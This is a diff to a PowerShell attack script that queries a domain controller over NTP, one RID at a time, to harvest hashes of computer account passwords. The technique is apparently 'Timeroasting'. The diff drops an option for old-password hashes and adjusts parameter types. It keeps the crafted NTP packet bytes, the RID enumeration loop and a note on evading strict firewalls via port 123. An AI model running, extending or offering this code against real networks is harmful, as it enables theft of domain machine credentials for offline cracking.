@@ -36,10 +36,6 @@
     possibly indicating that RID space has been exhausted.
     Default: 24.
 
-.PARAMETER oldHashes
-    Obtain hashes of the previous computer password instead of the
-    current one.
-
 .PARAMETER sourcePort
     NTP source port to use. A dynamic unprivileged port is chosen by default.
     Could be set to 123 to get around a strict firewall.
@@ -53,19 +49,16 @@ param(
     [string]$domainController,
 
     [string]$outputFile,
-    [Uint]$minRID = 0,
-    [Uint]$maxRID = 2147483648,
-    [Uint]$rate = 180,
-    [Uint]$timeout = 24,
-    [switch]$oldHashes,
+    [int]$minRID = 0,
+    [int]$maxRID = 2147483647,
+    [int]$rate = 180,
+    [int]$timeout = 24,
     [Uint16]$sourcePort
 )
 
 $ErrorActionPreference = "Stop"
 
 $NTP_PREFIX = [byte[]]@(0xdb,0x00,0x11,0xe9,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xe1,0xb8,0x40,0x7d,0xeb,0xc7,0xe5,0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xe1,0xb8,0x42,0x8b,0xff,0xbf,0xcd,0x0a)
-
-$keyFlag = $oldHashes ? 2147483648 : 0
 
 if ($outputFile) {
     Out-Null > $outputFile
@@ -87,7 +80,7 @@ for ($queryRid = $minRID; (Get-Date) -lt $timeoutTime; $queryRid++) {
     
     # Request as long as the maximal RID hasn't been reached yet.
     if ($queryRid -le $maxRID) {
-        $query = $NTP_PREFIX + [BitConverter]::GetBytes([Uint]($queryRid -bxor $keyFlag)) + [byte[]]::new(16)
+        $query = $NTP_PREFIX + [BitConverter]::GetBytes($queryRid) + [byte[]]::new(16)
         [void] $client.Send($query, $query.Length)
     }
     
